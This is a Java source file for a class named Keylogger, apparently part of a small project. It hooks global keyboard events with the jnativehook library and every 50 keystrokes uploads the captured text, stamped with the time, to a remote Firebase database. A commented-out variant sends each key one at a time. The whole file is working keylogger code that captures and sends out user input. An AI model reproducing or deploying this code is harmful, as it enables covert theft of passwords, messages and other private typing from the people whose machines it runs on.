package com.key;

import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.google.firebase.database.DatabaseReference;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class Keylogger implements NativeKeyListener {
    private static DatabaseReference dbRef;

    private String keystrokes;
    private int index;
    
        private static final int THRESHOLD=50;
    
        Keylogger() {
            dbRef = FirebaseConfig.getDatabaseReference();
        }
    
        @Override
        public void nativeKeyPressed(NativeKeyEvent e) {
            String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
            logKeystroke(keyText);
        }
    
        private void logKeystroke(String key) {
            keystrokes += key + " ";
            index++;
            if (index >= THRESHOLD) {
            String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());

            Map<String, Object> logEntry = new HashMap<>();
            logEntry.put("key", keystrokes); // Store the keyText directly under the timestamp

            dbRef.child(timestamp).setValueAsync(logEntry);

            index=0;
            keystrokes="";
        }
    }

    // private void logKeystroke(String keyText) {
    // String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new
    // Date());

    // Map<String, Object> logEntry = new HashMap<>();
    // logEntry.put("key", keyText); // Store the keyText directly under the
    // timestamp

    // dbRef.child(timestamp).setValueAsync(logEntry);
    // }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
    }
}
